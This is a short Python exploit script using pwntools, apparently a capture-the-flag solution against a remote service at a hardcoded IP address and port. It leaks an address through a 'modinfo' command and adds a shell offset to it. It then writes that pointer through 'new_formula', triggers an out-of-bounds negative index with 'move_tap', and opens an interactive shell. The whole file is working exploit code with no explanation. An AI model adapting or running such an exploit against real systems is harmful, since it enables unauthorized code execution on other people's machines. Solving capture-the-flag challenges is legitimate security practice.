
from pwn import *


# host = "localhost"
# port = "12345"

host = "35.198.185.193"
port = "1339"


shell_offset = 0x00001293

io = remote(host, port)
io.recvuntil('> ')
io.send("modinfo\n")


addr = int(io.recvuntil('> ').split('\n')[3].split(':')[1], 16)
log.info("addr : " + hex((addr)))


io.send("new_formula  " + p64(addr + shell_offset) + "\n")
io.recvuntil('> ')
io.send("move_tap -140203308077184 \n ")
io.recvuntil('> ')
io.send("fill 6 \n")
io.interactive()
io.close()
